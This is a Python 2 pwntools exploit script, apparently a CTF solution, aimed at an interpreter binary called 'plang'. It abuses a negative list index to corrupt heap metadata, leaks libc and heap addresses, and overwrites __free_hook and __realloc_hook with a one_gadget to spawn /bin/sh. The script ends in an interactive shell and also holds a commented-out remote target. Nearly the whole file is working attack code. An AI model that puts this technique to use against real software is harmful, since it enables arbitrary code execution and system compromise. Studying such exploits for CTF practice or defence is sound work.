#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''

    '''

    f = open('/tmp/gdb_symbols.c', 'w')
    f.write(gdb_symbols)
    f.close()
    os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
except Exception as e:
    print(e)

context.arch = "amd64"
# context.log_level = 'debug'
execve_file = './plang'
# sh = process(execve_file, env={"LD_PRELOAD": "/tmp/gdb_symbols.so"})
sh = process(execve_file)
# sh = remote('eonew.cn', 60107)
elf = ELF(execve_file)
libc = ELF('./libc-2.27.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    define se
        search -s aaaaaaaa heap
        search -s bbbbbbbb heap
        search -s rrrrrrrr heap
        search -s xxxxxxxx heap
        search -s yyyyyyyy heap
        end

    define s0
        set *(size_t *)($arg0)=$arg1
        end

    '''

    f = open('/tmp/pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdbscript', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def interpret(content):
    sh.sendlineafter('> ', content)

# pause()
interpret('var str = "aaaaaaaa"')
interpret('var list = [%lf, %lf, %lf, %lf]' % struct.unpack('dddd', 'b' * 8 + 'c' * 8 + 'd' * 8 + 'e' * 8))

# 0x70000008 is new size
interpret('list[-129] = %lf' % struct.unpack('d', p64(0x70000008ad1ef3ed)))
# leak libc in heap
interpret('var str2 = "%s"' % ('h' * 0x300))

offset = 2856
all_list = [i + offset for i in range(8)]
interpret('System.print(str[%d]+str[%d]+str[%d]+str[%d]+str[%d]+str[%d]+str[%d]+str[%d])' % tuple(all_list))
result = sh.recvline()[:-1]
main_arena_addr = u64(result.ljust(8, '\0')) - 96
log.success('main_arena_addr: ' + hex(main_arena_addr))
libc_addr = main_arena_addr - 0x3ebc40
log.success('libc_addr: ' + hex(libc_addr))


offset = 48
all_list = [i + offset for i in range(8)]
interpret('System.print(str[%d]+str[%d]+str[%d]+str[%d]+str[%d]+str[%d]+str[%d]+str[%d])' % tuple(all_list))
result = sh.recvline()[:-1]
heap_addr = u64(result.ljust(8, '\0')) - 0xd710
log.success('heap_addr: ' + hex(heap_addr))
str_offset_addr = heap_addr + 0x15370
log.success('str_offset_addr: ' + hex(str_offset_addr))

__free_hook_addr = libc_addr + libc.symbols['__free_hook']
log.success('__free_hook_addr: ' + hex(__free_hook_addr))
__realloc_hook_addr = libc_addr + libc.symbols['__realloc_hook']
log.success('__realloc_hook_addr: ' + hex(__realloc_hook_addr))

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

one_gadget_addr = libc_addr + 0x4f322
log.success('one_gadget_addr: ' + hex(one_gadget_addr))

# __free_hook
interpret('list[-29]=%.1800lf' % struct.unpack('d', p64(__free_hook_addr - 8)))
interpret('list[0]=%.1800lf' % struct.unpack('d', p64(one_gadget_addr)))


interpret('var list2 = [%lf, %lf]' %  struct.unpack('dd', 'x' * 8 + 'y' * 8))
# __realloc_hook
interpret('list2[-2]=%.1800lf' % struct.unpack('d', p64(__realloc_hook_addr - 8)))
interpret('list2[0]=%.1800lf' % struct.unpack('d', p64(libc_addr + libc.symbols['free'] + 6)))

sh.interactive()